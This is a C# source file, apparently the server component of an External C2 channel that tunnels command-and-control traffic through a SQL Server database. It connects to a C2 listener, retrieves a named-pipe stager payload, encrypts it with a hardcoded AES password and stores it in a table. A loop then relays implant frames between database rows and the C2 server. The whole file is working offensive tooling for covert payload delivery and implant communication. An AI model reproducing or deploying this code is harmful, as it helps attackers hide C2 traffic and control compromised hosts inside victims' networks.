using ExternalC2;
using System;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 0)
            {
                options.host = args[0];
                options.dbname = args[1];
                options.username = args[2];
                options.password = args[3];
                options.c2ip = args[4];
                options.c2port = args[5];
                options.pipe_name = args[6];
            }
            DATABASE.CreateDB();
            byte[] pdata = Encoding.ASCII.GetBytes("");
            string sqlStr = "select data from {0} where id = @id";
            int id = 1;
            SqlConnection sqlConnection = new SqlConnection(string.Format(options.connStr, options.host,options.dbname, options.username, options.password));
            SocketC2 socketC2 = new SocketC2(options.c2ip, options.c2port);
            socketC2.ServerChannel.Connect();
            byte[] stage = socketC2.ServerChannel.GetStager(options.pipe_name, true, 500);
            byte[] aes_stage = Encrypt(stage);
            DATABASE.insert_data(sqlConnection, options.table_server, aes_stage);

            while (true)
            {
                using (SqlCommand sqlCommand = new SqlCommand(string.Format(sqlStr, options.table_client), sqlConnection))
                {
                    if (sqlConnection.State != ConnectionState.Open)
                        sqlConnection.Open();
                    sqlCommand.Parameters.Add("@id", SqlDbType.Int).Value = id;
                    SqlDataReader dr = sqlCommand.ExecuteReader();
                    if (dr.HasRows)
                    {
                        dr.Read();
                        byte[] data = (byte[])dr["data"];
                        Console.WriteLine("get client payload success {0} bytes, 当前查询ID{1}", data.Length.ToString(), id.ToString());
                        socketC2.ServerChannel.SendFrame(data);
                        data = socketC2.ServerChannel.ReadFrame();
                        Console.WriteLine("get server payload success {0} bytes", data.Length.ToString());
                        DATABASE.insert_data(sqlConnection, options.table_server, data);
                        id += 1;
                        dr.Close();
                    }
                    dr.Close();
                }


            }
        }

        /// <summary>
        /// AES加密
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>
        public static byte[] Encrypt(byte[] input)
        {
            PasswordDeriveBytes pdb = new PasswordDeriveBytes("hjiweykaksd", new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }

        public static bool CheckMd5(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            if (a == null || b == null) return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i])
                    return false;
            return true;
        }
    }

}
